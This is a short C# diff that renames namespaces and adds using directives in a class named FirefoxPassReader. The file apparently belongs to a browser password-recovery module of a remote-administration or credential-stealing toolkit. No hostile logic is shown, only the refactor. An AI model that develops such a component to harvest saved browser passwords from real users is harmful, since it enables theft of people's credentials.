@@ -1,4 +1,4 @@
-﻿using Everything.Recovery.Utilities;
+﻿using Everything.Recovery.Browsers;
 using Newtonsoft.Json;
 using Newtonsoft.Json.Linq;
 using Q3C273.Shared.Models;
@@ -6,8 +6,10 @@ using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Text;
+using Ton618.Recovery;
+using Ton618.Recovery.Utilities;
 
-namespace Everything.Recovery.Browsers
+namespace Ton618.Recovery.Browsers
 {
     public class FirefoxPassReader : IAccountReader
     {
